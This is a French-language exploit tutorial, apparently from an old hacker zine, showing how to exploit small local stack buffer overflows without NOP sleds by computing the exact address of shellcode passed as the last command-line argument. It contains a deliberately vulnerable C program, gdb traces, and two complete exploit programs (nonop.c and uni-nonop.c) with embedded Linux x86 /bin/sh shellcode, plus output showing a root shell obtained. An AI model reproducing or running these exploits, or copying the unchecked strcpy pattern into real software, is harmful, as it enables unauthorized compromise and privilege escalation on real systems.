@@ -1,0 +1,444 @@
+[[------------------------------------------------------------------------]]
+           <<Nop Sux ... Buffer overflow & shellcode sans Nops>>
+				by Seb-Sb
+[[------------------------------------------------------------------------]]
+
+  Hum ... encore un petit complement "innovant" sur les buffer overflow
+en local. Lionel dans son article n'avait pas explique le cas des petits
+buffer ne permettant pas d'y placer un shellcode. Les sources qu'il donnait
+permettaient cependant d'exploiter cette possibilite .
+
+  Je ne fais que rappeler brievement la methode : au lieu de faire pointer
+eip approximativement vers le debut du buffer, on le fait pointer 
+approximativement vers les arguments de la ligne de commande . Pour cela, le
+shellcode etait precede d'une grande quantite de nop . Cette methode marche 
+certe tres bien ... 
+  Il y a cependant une petite chose qui disons m'ennuie ; c'est justement cette
+approximation. Il serait tellement mieux de pouvoir connaitre a coup sur 
+l'adresse du debut de notre shellcode, ce qui nous dispenserais par ailleurs
+du coup de remplir faire preceder notre shellcode de je ne sais combien de nop.
+  Par ailleurs ,notre methode doit nous permettre d'exploiter de petits buffer.
+Pour cela, on va donc placer notre shellcode dans les arguments de la ligne de 
+commande.
+
+      ###############################################################
+
+1) L'adressage des arguments
+   =========================
+
+  On y arrive : le but est donc de pouvoir connaitre exactement a l'avance 
+l'adresse de chacun de nos arguments . Mouais ... bah on va regarder un peu
+comment ca marche tout ca =)
+
+Voici le petit programme tout simple que nous allons torturer :
+
+--------------------- Cut ---------------------- Cut ----------------------
+
+int main(int argc, char  **argv)
+{
+  return (0);
+}
+
+--------------------- Cut ----------------------- Cut ---------------------
+
+Tres bien ... Appelons a notre rescousse notre ami prefere :
+
+[root@nol0gik small-buffers]# cc vuln1.c -ggdb -o vuln1
+[root@nol0gik small-buffers]# gdb -q vuln1
+(gdb) break main
+Breakpoint 1 at 0x804842f: file vuln1.c, line 11.
+(gdb) r
+Starting program: /proj/newbof/small-buffers/vuln1
+
+Breakpoint 1, main (argc=1, argv=0xbffffd54) at vuln1.c:11
+11        if (argc < 2)
+(gdb) inspect *(argv+0)
+$1 = 0xbffffe49 "/proj/newbof/small-buffers/vuln1"
+(gdb) inspect *(argv+1)
+$2 = 0x0
+(gdb) r toto
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /proj/newbof/small-buffers/vuln1 toto
+
+Breakpoint 1, main (argc=2, argv=0xbffffd44) at vuln1.c:11
+11        if (argc < 2)
+(gdb) inspect *(argv+0)
+$3 = 0xbffffe44 "/proj/newbof/small-buffers/vuln1"
+(gdb) inspect *(argv+1)
+$4 = 0xbffffe65 "toto"
+(gdb) inspect *(argv+2)
+$5 = 0x0
+(gdb) r toto test
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /proj/newbof/small-buffers/vuln1 toto test
+
+Breakpoint 1, main (argc=3, argv=0xbffffd44) at vuln1.c:11
+11        if (argc < 2)
+(gdb) inspect *(argv+0)
+$6 = 0xbffffe3f "/proj/newbof/small-buffers/vuln1"
+(gdb) inspect *(argv+1)
+$7 = 0xbffffe60 "toto"
+(gdb) inspect *(argv+2)
+$8 = 0xbffffe65 "test"
+(gdb)
+
+Bon , commencons par analyser ceci ... On constate que au fur et a mesure que
+le nombre d'arguments augmente, l'adresse de argv[0] est de plus en plus basse.
+On remarque par ailleurs que dans le 2eme exemple, le dernier argument "toto" 
+a la meme adresse que le dernier argument "test" du 3eme exemple.
+On remarque par ailleurs dans le 3eme exemple que la distance entre le debut du
+2eme argument est de 5 ... taille de "toto" : 4 ..suivi d'un caractere nul qui
+nous font 5 , le compte est bon ...
+Bon ... Vous avez vu comment j'analyse ... Refaites qqes exemples en faisait 
+varier le nombre et la taille des arguments et notez bien les adresses pour 
+voir les evolutions .. 
+
+On en deduit finalement que le caractere nul achevant le dernier argument est 
+toujours a la meme adresse memoire .. dumoins semble l'etre .
+Par ailleurs chaque argument est separe par un caractere nul.
+A partir de la , on peut commencer a calculer les adresses exactes de chaque 
+argument a l'avance ...
+
+En fait, il y a un dernier parametre qui joue : l'environnement. En effet il 
+est sauvegarde au sommet de la pile lors du chargement du programme pour etre 
+accesible ... Revenons a l'exemple precedant :
+
+(gdb) inspect *(argv+0)
+$6 = 0xbffffe3f "/proj/newbof/small-buffers/vuln1"
+(gdb) inspect *(argv+1)
+$7 = 0xbffffe60 "toto"
+(gdb) inspect *(argv+2)
+$8 = 0xbffffe65 "test"
+(gdb) q
+The program is running.  Exit anyway? (y or n) y
+[root@nol0gik small-buffers]# TOTO=TOTO
+[root@nol0gik small-buffers]# export TOTO
+[root@nol0gik small-buffers]# gdb -q vuln1
+(gdb) break main
+Breakpoint 1 at 0x804842f: file vuln1.c, line 11.
+(gdb) r toto test
+Starting program: /proj/newbof/small-buffers/vuln1 toto test
+
+Breakpoint 1, main (argc=3, argv=0xbffffd44) at vuln1.c:11
+11        if (argc < 2)
+(gdb) inspect *(argv+0)
+$1 = 0xbffffe35 "/proj/newbof/small-buffers/vuln1"
+(gdb) inspect *(argv+1)
+$2 = 0xbffffe56 "toto"
+(gdb) inspect *(argv+2)
+$3 = 0xbffffe5b "test"
+(gdb) _
+
+On note que la difference ,apres avoir exporte une nouvelle variable 
+d'environnement, entre les adresses des arguments est de exctement 10 :
+"TOTO" + son caractere nul + "TOTO" + son caractere nul = 10 octets .
+
+Ok .. Que penser de tout ceci ? Que pour un environnement fixe, l'adresse du
+caractere nl de terminaison du dernier argument est toujours a la meme adresse
+memoire ...
+
+        ##########################################################
+
+2) Realisation de l'exploit
+   ========================
+On va creer un petit programme bien specifique pour notre exemple :
+
+----------------- vuln1.c -------------------------
+int func(char *arg)
+{
+  char yop[10];
+  strcpy(yop,arg);
+  printf("Argument pris en compte.\n");
+  return (0);
+}
+
+int main(int argc, char **argv)
+{
+  if (argc < 2)
+    {
+      printf("Usage : %s param\n", argv[0]);
+      return (-1);
+    }
+  printf("Adresse du dernier argument : 0x%x\n", argv[argc -1]);
+  func(argv[1]);
+  return (0);
+}
+---------------------------------------------------
+
+[root@nol0gik small-buffers]# ./vuln1 a
+Adresse du dernier argument : 0xbffffe5b
+Argument pris en compte.
+[root@nol0gik small-buffers]# ./vuln1 ab
+Adresse du dernier argument : 0xbffffe5a
+Argument pris en compte.
+[root@nol0gik small-buffers]# ./vuln1 abc
+Adresse du dernier argument : 0xbffffe59
+Argument pris en compte.
+[root@nol0gik small-buffers]# ./vuln1 AAAAAAAAAAAAAAAAAAAA
+Adresse du dernier argument : 0xbffffe48
+Argument pris en compte.
+Segmentation fault (core dumped)
+[root@nol0gik small-buffers]# gdb -q --core=core
+Core was generated by `./vuln1 AAAAAAAAAAAAAAAAAAAA'.
+Program terminated with signal 11, Erreur de segmentation.
+#0  0x41414141 in ?? ()
+(gdb) _
+
+On voit donc que nous avons un petit buffer ... L'idee est de faire pointer 
+l'eip de retour vers un des arguments de la ligne de commande.
+
+Or nous pouvons calculer l'adresse exacte d'un argument puisque la fin de cet
+argument est a une adresse fixe. En supposons qu'on place notre shellcode comme
+dernier argument, connaissant sa taille exacte, on peut calculer l'adresse 
+de celui ci lors d'un appel a execve() .
+
+Voici a peu pres ce que ca donne :
+
+char shellcode = "\xeb ... /bin/sh";
+addr = argv[argc - 1] + strlen(argv[argc - 1]);
+addr -= strlen(shellcode);
+
+La addr contient l'adresse exacte du dernier argument de la ligne de commande 
+qui sera notre shellcode .
+A partir de la, l'utilisation de nop n'est plus necessaire.
+
+Je ne m'etends pas plus sur le code lui meme ... le voici :
+( un detail extern char **environ permet de conserver l'environnements ).
+
+----------------- nonop.c      ----------------------
+/* Linux i86 shellcode : run /bin/sh */
+
+char shellcode[] =
+                   "\xeb\x1f\x5e\x89\x76\x08\x31\xc0"
+                   "\x89\x46\x0c\x88\x46\x07\xb0\x0b"
+                   "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"
+                   "\xcd\x80\x31\xdb\x88\xd8\x40\xcd"
+                   "\x80\xe8\xdc\xff\xff\xff\x2f\x62"
+                   "\x69\x6e\x2f\x73\x68";
+int main(int argc, char **argv)
+{
+  int i;
+  unsigned long *ptr;
+  unsigned long retaddr;
+  char *cmd[4];
+  /* Used to keep the same environment */
+  extern char **environ;
+
+  if (argc != 3)
+    {
+      printf("Usage : %s <target> <buffer size>\n", argv[0]);
+      return (-1);
+    }
+
+  /* Getting Address of null byte ending last argument */
+  (char *) retaddr = argv[2] + strlen(argv[2]);
+
+  /* Calculating address of future last argument containing our shellcode */
+  retaddr -= strlen(shellcode);
+  retaddr += 2;
+
+  printf("shellcode addr : 0x%x\n", retaddr);
+
+  cmd[0] = (char *) malloc(strlen(argv[1] + 1));
+  strcpy(cmd[0], argv[1]);
+
+  cmd[1] = (char *) malloc(atoi(argv[2]) + 1);
+  (char *) ptr = cmd[1];
+  for (i = 0; i < atoi(argv[2]); i += 4)
+    {
+      *(ptr++) = retaddr;
+    }
+
+  cmd[2] = (char *) malloc(strlen(shellcode) + 1);
+  strcpy(cmd[2], shellcode);
+
+  cmd[3] = 0;
+
+  execve(cmd[0], cmd, environ);
+
+  return (0);
+}
+
+------------ nonop.c ------------------------------------
+
+Voyons voir l'utilisation .. Nous avons vu que 20 caracteres etait necessaire 
+pour overflower exactement l'eip sauvegarde ...
+
+[root@nol0gik small-buffers]# ./nonop vuln1 20
+shellcode addr : 0xbffffe31
+Last argument addr is : 0xbffffe31
+Argument pris en compte.
+bash# _
+
+Bingo ... du premier coup ... 
+Et sans aucun nop, contrat rempli :p
+
+Plus interessant, ceci : 
+
+[root@nol0gik small-buffers]# ./nonop vuln1 2000
+shellcode addr : 0xbffffe31
+Last argument addr is : 0xbffffe31
+Argument pris en compte.
+bash# _
+
+Hehe ... on peut y aller .. Cela permet de vite tester si un programme est 
+buffer est overflowable et ceci juste avec une grande valeur de buffer qui
+ecrasera une grande partie de la pile.
+
+Je pense que si vous lisez cet article, vous aurez parfaitement les competences
+de recoder nonop.c pour qu'il corresponde a vos besoins .
+
+           #######################################################
+3) Notes & remarques
+   =================
+
+Il y a deux cas dans lequel il convient d'etre prudent : 
+Certains programmes necessitent un nombre d'arguments precis, ni plus ni moins.
+
+exemple : remplacez le if (argc < 2) par un if (argc != 2) dans notre programme
+vuln1.c ...
+Pas de probleme :)
+En fait, il suffit de coller votre shellcode au parametre qui overflow le 
+buffer. Voici le code modifie de nonop.c qui le fait de cette maniere .
+
+
+----------------- uni-nonop.c ----------------------------------------
+/*
+ * Seb-Sb@caramail.com
+ *
+ */
+
+/* Linux i86 shellcode : run /bin/sh */
+
+char shellcode[] =
+                   "\xeb\x1f\x5e\x89\x76\x08\x31\xc0"
+                   "\x89\x46\x0c\x88\x46\x07\xb0\x0b"
+                   "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"
+                   "\xcd\x80\x31\xdb\x88\xd8\x40\xcd"
+                   "\x80\xe8\xdc\xff\xff\xff\x2f\x62"
+                   "\x69\x6e\x2f\x73\x68";
+int main(int argc, char **argv)
+{
+  int i;
+  unsigned long *ptr;
+  unsigned long retaddr;
+  char *cmd[3];
+  extern char **environ;
+
+  if (argc != 3)
+    {
+      printf("Usage : %s <target> <buffer size>\n", argv[0]);
+      return (-1);
+    }
+  
+  /* Getting Address of null byte ending last argument */
+  (char *) retaddr = argv[2] + strlen(argv[2]);
+  
+  /* Calculating address of future last argument containing our shellcode */
+  retaddr -= strlen(shellcode);
+  retaddr += 2;
+  
+  printf("shellcode addr : 0x%x\n", retaddr);
+  
+  cmd[0] = (char *) malloc(strlen(argv[1] + 1));
+  strcpy(cmd[0], argv[1]);
+  
+  cmd[1] = (char *) malloc(atoi(argv[2]) + strlen(shellcode) + 1);
+  bzero(cmd[1], atoi(argv[2]) + strlen(shellcode) + 1);
+  (char *) ptr = cmd[1];
+  for (i = 0; i < atoi(argv[2]); i += 4)
+    {
+      *(ptr++) = retaddr;
+    }
+  
+
+  strcat(cmd[1], shellcode);
+  
+  cmd[2] = 0;
+
+  execve(cmd[0], cmd, environ);
+  
+  return (0);
+}
+
+-------------- uni-nonop.c ------------------------------------
+
+Voici la deuxieme remarque : Vous avez vu qu'on pouvait utiliser en precisant 
+n'importe quel taille de buffer des que cette taille permet d'ecraser eip ...
+Mefiez vous de cette specificite car l'adresse de votre shellcode va continue 
+a etre ecrit a la suite dans la pile, c'est a dire dans les arguments qui ont 
+ete passe a la fonction dans laquelle se produit l'overflow ... Imaginez donc 
+que ce soit une fonction telle celle-ci :
+
+str_chr(char *dst, int *(tab[8]), char *src, char car)
+{
+  char temp[9];
+  int i;
+  int j;
+  
+  strcpy(temp, src);
+  
+  for (i = 0, j = 0; i < 8; i ++)
+    {
+      if (temp[i] == car)
+        {
+	  *(tab[i]) = 1;
+	}
+      else
+        {
+          *(tab[i]) = 0;
+	  dst[j] = temp[i];
+	  j ++;
+	}
+    }
+}
+
+Bon, voici a quoi sert cette fonction :
+Vous lui precisez une chaine destination,une chaine source, un tableau de 8 
+entiers et un caractere .
+Pour les 8 caracteres, la fonction va soit mettre dans l'entier pointe par
+tab[i] si le ieme lettre du buffer source correspond au caractere argument.
+
+un exemple sera plus parlant :
+
+int mat[8];
+char toto = "Hedgekoe";
+char resultat[9];
+
+str_chr(resultat, &mat[0], toto, 'e');
+
+Voici le resultat que nous obtiendrons :
+resultat : "Hdgko"
+mat : [0][1][0][0][1][0][0][1]
+
+Bon en fait, on voit que la fonction modifie ce vers quoi pointe les parametres
+qui lui sont passes ... 
+
+Ici, pour l'overflower,il faut y mettre 20 caracteres. Cependant si on depasse,
+C'est alors les adresses des parametres passes a str_chr() qui vont changer.
+Ca veut dire que par exemple dst va pointe vers notre shellcode.
+C'est donc notre shellcode qui va etre modfie par la fonction str_chr() ce qui 
+fera qu'une fois runne, celui ci n'a quasiment aucunes chance de marcher 
+puisqu'il a ete modifie ... 
+
+Je sais que ceci n'est pas tres clair sur cette derniere partie . Mais c'est 
+principalement pour rappeler que meme si on peut overflower certain buffer 
+de 10 octets avec 2000 fois l'adresse de notre shellcode et que ca marche 
+parfaitement. Il peut arriver periodiquement que soudain , ce la provoque des
+erreurs.
+
+[[--------------------------------------------------------------------------]]
+
+  Voila, je pense que cet article sera a meme d'en interesser quelqu'uns
+ne serait-ce pour les histoires d'adresses des arguments.
+   En esperant ne pas avoir profere trop de betises ...
+
+		                                        Seb-Sb
+					           Seb-Sb@Caramail.com
+                                                      OrganiKs CreW
+
+Thanx : MayheM, binf ,duke ,#phrack & #rhino9 
+
+[[--------------------------------------------------------------------------]]
